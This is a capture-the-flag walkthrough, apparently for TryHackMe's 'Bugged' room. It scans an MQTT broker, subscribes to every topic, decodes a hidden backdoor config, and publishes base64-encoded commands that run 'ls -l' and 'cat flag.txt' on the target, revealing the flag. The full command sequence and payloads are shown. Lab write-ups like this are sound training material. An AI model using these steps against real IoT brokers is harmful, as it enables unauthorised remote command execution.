# Bugged

> ************************Instructions************************
John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?
> 

# Enumeration

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn 10.10.42.17  
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 01:51 EDT
Nmap scan report for 10.10.42.17
Host is up (0.19s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
1883/tcp open  mqtt

Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -T4 -Pn -p 1883 10.10.42.17                                                   
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 01:52 EDT
Nmap scan report for 10.10.42.17
Host is up (0.18s latency).

PORT     STATE SERVICE                  VERSION
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/uptime: 209 seconds
|     $SYS/broker/store/messages/count: 52
|     $SYS/broker/version: mosquitto version 2.0.14
|     frontdeck/camera: {"id":9139642479644207274,"yaxis":45.888535,"xaxis":-117.04636,"zoom":1.3970078,"movement":false}
|     $SYS/broker/messages/sent: 321
|     $SYS/broker/load/messages/received/1min: 89.35
|     $SYS/broker/bytes/received: 15395
|     $SYS/broker/load/connections/1min: 0.95
|     $SYS/broker/load/bytes/received/15min: 914.32
|     $SYS/broker/load/messages/received/15min: 19.07
|     $SYS/broker/load/sockets/5min: 0.30
|     patio/lights: {"id":9704591631101614493,"color":"WHITE","status":"OFF"}
|     $SYS/broker/load/bytes/sent/15min: 76.35
|     $SYS/broker/load/messages/sent/15min: 19.07
|     $SYS/broker/messages/stored: 52
|     storage/thermostat: {"id":8572959658584139974,"temperature":23.868784}
|     $SYS/broker/load/messages/sent/1min: 89.35
|     kitchen/toaster: {"id":3008033130373339998,"in_use":false,"temperature":156.98357,"toast_time":275}
|     $SYS/broker/load/connections/15min: 0.12
|     livingroom/speaker: {"id":6563839932972676410,"gain":66}
|     $SYS/broker/store/messages/bytes: 301
|     $SYS/broker/publish/bytes/received: 10986
|     $SYS/broker/messages/received: 321
|     $SYS/broker/load/bytes/received/1min: 4286.37
|     $SYS/broker/load/bytes/sent/1min: 357.43
|     $SYS/broker/load/messages/sent/5min: 46.11
|     $SYS/broker/load/messages/received/5min: 46.11
|     $SYS/broker/load/connections/5min: 0.30
|     $SYS/broker/load/sockets/1min: 0.95
|     $SYS/broker/bytes/sent: 1285
|     $SYS/broker/load/bytes/received/5min: 2208.12
|     $SYS/broker/load/sockets/15min: 0.12
|_    $SYS/broker/load/bytes/sent/5min: 184.52
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 1883/tcp)
HOP RTT       ADDRESS
1   182.34 ms 10.8.0.1
2   182.68 ms 10.10.42.17

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.89 seconds
```

# Research

Sources:

- [https://www.speedguide.net/port.php?port=1883](https://www.speedguide.net/port.php?port=1883)
- [https://mosquitto.org/](https://mosquitto.org/)

| Port | Protocol | Service | Details |
| --- | --- | --- | --- |
| 1883 | tcp, udp | mqtt | MQTT (Message Queuing Telemetry Transport Protocol, IANA Official). Also uses port 8883. |
| 1883 | tcp, udp | mqtt | Message Queuing Telemetry Transport Protocol, modified: 2015-02-10 |

> **********************Definitions**********************
The MQTT protocol provides a lightweight method of carrying out messaging using a publish/subscribe model
> 

### Installation
```
sudo apt install mosquitto mosquitto_client
```

### mosquitto_sub

```
# subscribe to topics and print the messages that it receives.
mosquitto_sub --host [TARGET_IP] -t [topic to subscribe]
```

### mosquitto_pub

```
# publish a single message on a topic and exit.
mosquitto_pub --host [TARGET_IP] -t [topic to subscribe] -m [message]
```

# Exploit

First of all, use `#` at `-t` flag to get all the messages from all topics in live time

```
┌──(kali㉿kali)-[~/TryHackMe/Bugged]
└─$ mosquitto_sub -h 10.10.42.17 -t '#' -v            
frontdeck/camera {"id":5460527378062973855,"yaxis":141.77774,"xaxis":124.81772,"zoom":0.4883588,"movement":true}
livingroom/speaker {"id":16843505879143924978,"gain":63}
storage/thermostat {"id":4395717556585969881,"temperature":23.463305}
patio/lights {"id":14530635628880206321,"color":"PURPLE","status":"ON"}
kitchen/toaster {"id":10322698927666161509,"in_use":false,"temperature":150.33327,"toast_time":171}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
livingroom/speaker {"id":12408841288005298129,"gain":62}
storage/thermostat {"id":615177459352875140,"temperature":23.89766}
patio/lights {"id":2751799768089831188,"color":"BLUE","status":"OFF"}
storage/thermostat {"id":7347148780564976024,"temperature":24.18448}
frontdeck/camera {"id":3908255171536805958,"yaxis":3.6485748,"xaxis":162.59189,"zoom":3.3576634,"movement":false}
kitchen/toaster {"id":13440382093571302118,"in_use":false,"temperature":141.36652,"toast_time":301}
livingroom/speaker {"id":169712779369498559,"gain":75}
patio/lights {"id":9145321427269094899,"color":"BLUE","status":"OFF"}
storage/thermostat {"id":15099712137243374511,"temperature":24.31332}
livingroom/speaker {"id":2355515328475153928,"gain":49}
```

Notice on `yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config`’s response message, decode as ************base64************:

```
┌──(kali㉿kali)-[~/TryHackMe/Bugged]
└─$ echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==" | base64 -d                                       
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

There are 3 `registered_commands` with `HELP`, `CMD`, `SYS`. Within the `sub_topic`,  send the commands as `message` with `mosquitto_pub` while using `mosquitto_sub` to capture every response messages:

```
┌──(kali㉿kali)-[~/TryHackMe/Bugged]
└─$ mosquitto_sub -h 10.10.42.17 -t '#' -v
storage/thermostat {"id":5700104243079554945,"temperature":24.03117}
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub {"HELP"}
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
patio/lights {"id":12218462042934692178,"color":"RED","status":"ON"}
frontdeck/camera {"id":7971396130132028819,"yaxis":34.95494,"xaxis":94.95572,"zoom":2.3853226,"movement":false}
kitchen/toaster {"id":14652894339617004524,"in_use":true,"temperature":143.19398,"toast_time":213}
livingroom/speaker {"id":18148429892679465070,"gain":61}
storage/thermostat {"id":11674297745777589942,"temperature":23.317457}
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub {"CMD"}
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
livingroom/speaker {"id":17100061392657205330,"gain":75}
storage/thermostat {"id":13737654904316564727,"temperature":23.68693}
patio/lights {"id":3507641961998214885,"color":"GREEN","status":"ON"}
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub {"SYS"}
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
kitchen/toaster {"id":3782926357831231485,"in_use":true,"temperature":141.90123,"toast_time":328}
```

```
┌──(kali㉿kali)-[~]
└─$ mosquitto_pub -h 10.10.42.17 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m '{"HELP"}'
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ mosquitto_pub -h 10.10.42.17 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m '{"CMD"}' 
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ mosquitto_pub -h 10.10.42.17 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m '{"SYS"}'

┌──(kali㉿kali)-[~]
└─$ echo "SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=" | base64 -d
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

Decode the ********************************************base64 encoded message********************************************, an error return with **********************Invalid message format********************** and it seems like the sent message was missing the `id` field.

Insert the `id` with the first response into the message: `{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"HELP"}`, then encode it with ************base64************ and send the message:

```
┌──(kali㉿kali)-[~/TryHackMe/Bugged]
└─$ mosquitto_sub -h 10.10.42.17 -t '#' -v
livingroom/speaker {"id":16950646381044859124,"gain":50}
storage/thermostat {"id":2761534626536676819,"temperature":24.16411}
patio/lights {"id":18043938229121287499,"color":"PURPLE","status":"ON"}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
kitchen/toaster {"id":14501711905784232164,"in_use":true,"temperature":145.87343,"toast_time":219}
frontdeck/camera {"id":15056836406154766841,"yaxis":2.5350952,"xaxis":-57.122887,"zoom":3.572376,"movement":false}
livingroom/speaker {"id":4303331705194173036,"gain":70}
storage/thermostat {"id":5232748265716918663,"temperature":24.02742}
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkhFTFAifQo=
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ==
storage/thermostat {"id":2810478332183066048,"temperature":23.812408}
patio/lights {"id":13807830828050947843,"color":"ORANGE","status":"ON"}
livingroom/speaker {"id":14644381017643450500,"gain":71}
```

```
┌──(kali㉿kali)-[~]
└─$ echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkhFTFAifQo=" | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"HELP"}
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ mosquitto_pub -h 10.10.42.17 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkhFTFAifQo='

┌──(kali㉿kali)-[~]
└─$ echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ==" |base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ echo """{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}"""
zsh: parse error near `}'
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ echo '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}'
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:
    Base64({
        \"id\": \"<Backdoor ID>\",
        \"cmd\": \"<Command>\",
        \"arg\": \"<arg>\",
    })

Commands:
    HELP: Display help message (takes no arg)
    CMD: Run a shell command
    SYS: Return system information (takes no arg)
"}
```

After getting the full manual usage of this ******************sub_topic******************, It’s time to get in and extract more information!

The `CMD` is used to *******************run a shell command******************* with `arg` is the command that would be executed. For that, embed `ls -l` to retrieve the current files or directories in the current path of the workspace:

```
┌──(kali㉿kali)-[~/TryHackMe/Bugged]
└─$ mosquitto_sub -h 10.10.42.17 -t '#' -v
kitchen/toaster {"id":18076816763043406609,"in_use":true,"temperature":146.07935,"toast_time":206}
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImxzIC1sIn0K
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoidG90YWwgNFxuLXJ3LXItLXItLSAxIHJvb3Qgcm9vdCAzOSBNYXIgMjEgIDIwMjIgZmxhZy50eHRcbiJ9
storage/thermostat {"id":1969346242689470933,"temperature":23.773834}
patio/lights {"id":12967775592109393697,"color":"BLUE","status":"OFF"}
livingroom/speaker {"id":1903404796484313824,"gain":53}
```

```
┌──(kali㉿kali)-[~]
└─$ echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImxzIC1sIn0K" | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"ls -l"}
                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ mosquitto_pub -h 10.10.42.17 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImxzIC1sIn0K'
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoidG90YWwgNFxuLXJ3LXItLXItLSAxIHJvb3Qgcm9vdCAzOSBNYXIgMjEgIDIwMjIgZmxhZy50eHRcbiJ9" | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"total 4\n-rw-r--r-- 1 root root 39 Mar 21  2022 flag.txt\n"}
```

Luckily, the `flag.txt` is here!

Simply use `cat` to get the content inside the flag:

```
┌──(kali㉿kali)-[~/TryHackMe/Bugged]
└─$ mosquitto_sub -h 10.10.42.17 -t '#' -v
storage/thermostat {"id":17970961110636410652,"temperature":23.368223}
kitchen/toaster {"id":8194161676221964583,"in_use":true,"temperature":141.23404,"toast_time":326}
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImNhdCBmbGFnLnR4dCJ9Cg==
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9
storage/thermostat {"id":9589420865462101448,"temperature":24.017637}
frontdeck/camera {"id":14083149673009602569,"yaxis":67.438065,"xaxis":55.772064,"zoom":4.993948,"movement":false}
livingroom/speaker {"id":2109762342002499077,"gain":58}
patio/lights {"id":3323710569029270447,"color":"WHITE","status":"OFF"}
```

Remember to ************encode************ the ***************sending message*************** and ************decode************ the ****************response message****************:

```
┌──(kali㉿kali)-[~]
└─$ echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImNhdCBmbGFnLnR4dCJ9Cg==' | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat flag.txt"}
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ mosquitto_pub -h 10.10.42.17 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImNhdCBmbGFnLnR4dCJ9Cg=='
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9" | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"}
```